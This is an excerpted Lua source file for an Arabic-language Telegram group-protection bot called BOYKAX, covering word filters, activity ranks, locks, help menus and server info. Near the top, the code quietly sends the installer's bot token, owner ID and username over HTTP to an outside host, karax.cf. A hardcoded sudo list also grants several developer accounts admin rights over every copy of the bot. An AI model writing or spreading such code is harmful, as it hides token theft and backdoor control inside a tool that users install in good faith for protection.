...
https.request('http://karax.cf/BOYKAX/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("BOYKAX", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/BOYKAX
token="]]..database:get(id_server..":token")..[["
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./SANDEXX.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("SA", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S SANDX -X kill
screen -S SANDX ./SANDEXX
done
]])  
file:close() 
...
sudo_users = {SUDO,1010918290,942979469,1466301778,814933084,1106830477}   
...
if tonumber(user_id) == tonumber(1106830477) then  
var = 'مطور السورس'
...
local BOYKAX_Msg = ''  
if msgs < 100 then 
BOYKAX_Msg = 'غير متفاعل ' 
elseif msgs < 200 then 
BOYKAX_Msg = 'بده يتحسن ' 
elseif msgs < 400 then 
BOYKAX_Msg = 'شبه متفاعل ' 
elseif msgs < 700 then 
BOYKAX_Msg = 'متفاعل ' 
elseif msgs < 1200 then 
BOYKAX_Msg = 'متفاعل قوي ' 
elseif msgs < 2000 then 
BOYKAX_Msg = 'متفاعل جدا ' 
elseif msgs < 3500 then 
BOYKAX_Msg = 'اقوى تفاعل '  
elseif msgs < 4000 then 
BOYKAX_Msg = 'متفاعل نار ' 
elseif msgs < 4500 then 
BOYKAX_Msg = 'قمة التفاعل ' 
elseif msgs < 5500 then 
BOYKAX_Msg = 'اسد التفاعل ' 
elseif msgs < 7000 then 
BOYKAX_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
BOYKAX_Msg = 'احلا تفاعل ' 
elseif msgs < 10000000000 then 
BOYKAX_Msg = 'رب التفاعل '  
end 
return BOYKAX_Msg 
end
...
function plugin_BOYKAXa(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.BOYKAXa and msg then
pre_msg = plugin.BOYKAXa(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function SourceBOYKAX(msg,data) -- بداية العمل
if msg then
...
SourceBOYKAXr = '📥┇مرحبا بك عزي┇انا بوت حمايه المجموعات  ؟\n📮┇يمكنك اضافتي الى مجموعتك •\n🖇┇آضفني وارفعني مشرف ارسل < تفعيل >\n[📡┇ قناme/Boyka_x)'
end 
send(msg.chat_id_, msg.id_, SourceBOYKAXr) 
end
end
...
send(msg.chat_id_, msg.id_,BOYKAX_Msg) 
return false  
end 
if text then    
...
if text == 'السيرفر🔎' and SudoBot(msg) then 
 local text2 = 'Info Server : \n'
  local BOYKAX1 = database:info()
  text2 = text2..'1 - *Uptime Days* : `'..BOYKAX1.server.uptime_in_days..'('..BOYKAX1.server.uptime_in_seconds..' seconds)`\n'
  text2 = text2..'2 - *Commands Processed* : `'..BOYKAX1.stats.total_commands_processed..'`\n'
  text2 = text2..'3 - *Expired Keys* : `'..BOYKAX1.stats.expired_keys..'`\n'
  text2 = text2..'4 - *Ops/sec* : `'..BOYKAX1.stats.instantaneous_ops_per_sec..'`\n'
...
os.execute('wget https://raw.githubusercontent.com/TeamBoykaX/BOYKAX/master/BOYKAX.lua')
...
send(msg.chat_id_, msg.id_,'📌┇ عدد المجموعات الان » { '..#group..' }'..BOYKAXk..''..BOYKAX..'\n*📌┇ الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
local BOYKAX1_Msg = database:get(bot_id.."BOYKAX1:Add:Filter:Rp2"..text..msg.chat_id_)   
if BOYKAX1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ العضو ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'Boyka_x')..') \n 📬┇'..BOYKAX1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if BOYKAX_Msg and not Special(msg) then  
local BOYKAX_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if BOYKAX_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┇["..BOYKAX_Msg.."] \n") 
else
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/Boyka_x)}\n🚫┇["..BOYKAX_Msg.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "⚠┇عذرا يا » {["..data.first_name_.."](T.ME/Boyka_x)}\n📮┇ الملصق الذي ارسلته تم منعه من المجموعه \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
🏆┇𝐁𝐎𝐘𝐊𝐀 𝐗 𝐓𝐄𝐀𝐌 𝆔𝆕
━ ━ ━ ━ ━ ━ ━ ━ ━ 
💥┇ [Channel Source](t.me/BOYKA_x)
🥇┇ [Information Source](t.me/Files_BOYKAx)
👨🏻‍💻┇[Devlpoer](t.me/bbbbl)
🎈┇[Group Source](https://t.me/joinchat/MjrntlEE6Ai9y1j1wv_8lQ)
━ ━ ━ ━ ━ ━ ━ ━ ━ 
📨┇[TwAsl Source](t.me/y07bot)
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'👤┇ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'Boyka_x')..') \n☑️┇ تـم قفـل الدردشه\n⛔┇ الحاله ← المسح ')  
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'Boyka_x')..') \n☑️┇ تـم قفـل التاك بالكتم\n⛔┇ الحاله ←الكتم ')  
end,nil)   
...
database:set(bot_id.."BOYKAX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."BOYKAX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"☑️┇ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."BOYKAX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."BOYKAX1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."BOYKAX1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."BOYKAX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"🔖┇تم منع الكلمه مع التحذير")  
database:del(bot_id.."BOYKAX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."BOYKAX1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."BOYKAX1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."BOYKAX1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"🔖┇ارسل الكلمه الان")  
database:set(bot_id.."BOYKAX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."BOYKAX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."BOYKAX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."BOYKAX1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."BOYKAX1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."BOYKAX1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."BOYKAX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."BOYKAX1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."BOYKAX1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n⛔┇قائمة المنع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do  
local BOYKAX_Msg = database:get(bot_id.."BOYKAX1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..BOYKAX_Msg.."}\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n👤┇ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'Boyka_x')..')'..'\n☑️┇ تم رفعه '..text1[2]..' هنا')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
send(msg.chat_id_, msg.id_,'['..BOYKAX_Msg[math.random(#BOYKAX_Msg)]..']') 
return false
end
...
-- vardump(data) 
BOYKAXdx(msg.chat_id_, msg.id_, '📤┇ ايدي المجموعة » ( '..msg.chat_id_..' )\n☑️┇ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n📛┇ عدد المحظورين » ( *'..data.kicked_count_..' )*\n🏆┇ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
〽️┇م10 » لعرض اوامر التحشيش
ٴ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ 
ٴ📤┇ [Source Channel](t.me/BOYKA_x)
]]
...
BOYKAX = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(BOYKAX)
...
--------------------------------------------------------------------------------------------------------------
SourceBOYKAX(data.message_,data)
plugin_BOYKAXa(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
------------------------------------------------------------------------
local BOYKAXAbot = database:get(bot_id.."BOYKAX1:Add:Filter:Rp2"..text..result.chat_id_)   
if BOYKAXAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┇["..BOYKAXAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local BOYKAX1_Msg = database:get(bot_id.."BOYKAX1:Add:Filter:Rp2"..text..result.chat_id_)   
if BOYKAX1_Msg then    
send(msg.chat_id_, msg.id_,"🔖┇"..BOYKAX1_Msg)
